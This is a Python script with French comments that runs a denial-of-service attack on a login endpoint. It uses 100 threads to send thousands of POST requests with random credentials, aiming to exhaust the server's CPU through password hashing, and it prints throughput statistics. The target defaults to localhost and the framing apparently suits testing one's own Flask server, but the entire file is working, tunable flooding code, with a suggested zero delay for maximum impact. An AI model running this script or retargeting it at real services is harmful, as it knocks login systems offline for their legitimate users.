# dos_hashing_attack.py
import requests
import threading
import time
import sys
import random
import string

# --- Configuration de l'Attaque ---
TARGET_URL = "http://127.0.0.1:8000/login" # Assurez-vous que c'est l'IP et le port de votre serveur Flask
NUM_THREADS = 100  # Nombre de "clients" concurrents simulant l'attaque.
                    # Augmentez ce nombre progressivement pour voir l'impact.
REQUESTS_PER_THREAD = 200 # Nombre de requêtes POST que chaque thread va envoyer.
DELAY_PER_REQUEST = 0.001 # Délai très court entre les requêtes de chaque thread (en secondes).
                           # Mettez à 0 pour une attaque maximale, mais attention à la saturation de votre machine attaquante.

# --- Compteurs globaux pour les statistiques ---
successful_requests = 0
failed_requests = 0
start_time = 0
lock = threading.Lock() # Verrou pour protéger les compteurs partagés

def generate_random_string(length=15):
    """Génère une chaîne aléatoire pour simuler un mot de passe varié."""
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))

def send_login_requests(thread_id):
    global successful_requests, failed_requests

    for i in range(REQUESTS_PER_THREAD):
        username = "user" + str(random.randint(1, 99999)) # Utilisateur aléatoire
        password = generate_random_string(random.randint(10, 20)) # Mot de passe aléatoire de longueur variable

        payload = {
            'username': username,
            'password': password
        }
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': f'DoS-Simulator-Thread-{thread_id}' # Pour identifier les requêtes si besoin
        }

        try:
            # Envoi de la requête POST au formulaire de login.
            # Timeout court pour ne pas bloquer les threads si le serveur est trop lent.
            response = requests.post(TARGET_URL, data=payload, headers=headers, timeout=5)
            
            with lock: # Protéger l'accès aux compteurs partagés
                if response.status_code == 200:
                    successful_requests += 1
                else:
                    failed_requests += 1
            
            # Afficher la progression pour le thread 0 uniquement pour éviter un spam excessif
            if thread_id == 0 and i % 20 == 0:
                sys.stdout.write(f"\rThread {thread_id}: Sent {i+1}/{REQUESTS_PER_THREAD} attempts. Total success: {successful_requests}, Total failed: {failed_requests}")
                sys.stdout.flush()

        except requests.exceptions.Timeout:
            with lock:
                failed_requests += 1
            # print(f"Thread {thread_id}: Timeout occurred for {TARGET_URL}")
        except requests.exceptions.ConnectionError:
            with lock:
                failed_requests += 1
            # print(f"Thread {thread_id}: Connection error to {TARGET_URL}")
        except requests.exceptions.RequestException as e:
            with lock:
                failed_requests += 1
            # print(f"Thread {thread_id}: An unexpected error occurred: {e}")
        
        time.sleep(DELAY_PER_REQUEST)
    # print(f"\nThread {thread_id}: Finished sending its requests.") # Décommenter pour plus de détails


def main():
    global start_time, successful_requests, failed_requests

    print("--- Simulation d'Attaque DoS : Saturation CPU par Hachage ---")
    print(f"Cible : {TARGET_URL}")
    print(f"Nombre de threads (attaquants simultanés) : {NUM_THREADS}")
    print(f"Requêtes par thread : {REQUESTS_PER_THREAD}")
    print(f"Total des tentatives de login simulées : {NUM_THREADS * REQUESTS_PER_THREAD}")
    print("\nLancement de la simulation... (Appuyez sur Ctrl+C pour arrêter)")

    threads = []
    start_time = time.time()

    try:
        for i in range(NUM_THREADS):
            thread = threading.Thread(target=send_login_requests, args=(i,))
            threads.append(thread)
            thread.start()

        # Garder le thread principal actif et afficher la progression
        while any(thread.is_alive() for thread in threads):
            with lock:
                total_sent = successful_requests + failed_requests
            sys.stdout.write(f"\rProgression totale : {total_sent} tentatives | Succès HTTP: {successful_requests} | Échecs HTTP/Erreurs: {failed_requests} | Temps écoulé: {time.time() - start_time:.2f}s")
            sys.stdout.flush()
            time.sleep(1) # Mettre à jour toutes les secondes

    except KeyboardInterrupt:
        print("\nSimulation interrompue par l'utilisateur.")
    finally:
        # Attendre que tous les threads se terminent (ou joignez-les si interrompu)
        for thread in threads:
            if thread.is_alive():
                thread.join(timeout=1) # Donnez un petit délai aux threads pour se nettoyer

        end_time = time.time()
        total_time = end_time - start_time
        total_requests_sent = successful_requests + failed_requests

        print("\n\n--- Résultats de la Simulation ---")
        print(f"Total des tentatives de login effectuées : {total_requests_sent}")
        print(f"Réponses HTTP réussies (y compris les erreurs de login) : {successful_requests}")
        print(f"Requêtes échouées (timeouts ou erreurs de connexion) : {failed_requests}")
        print(f"Temps total écoulé : {total_time:.2f} secondes")
        if total_time > 0:
            print(f"Tentatives de login par seconde (APS) : {total_requests_sent / total_time:.2f}")
        print("----------------------------------")

if __name__ == "__main__":
    main()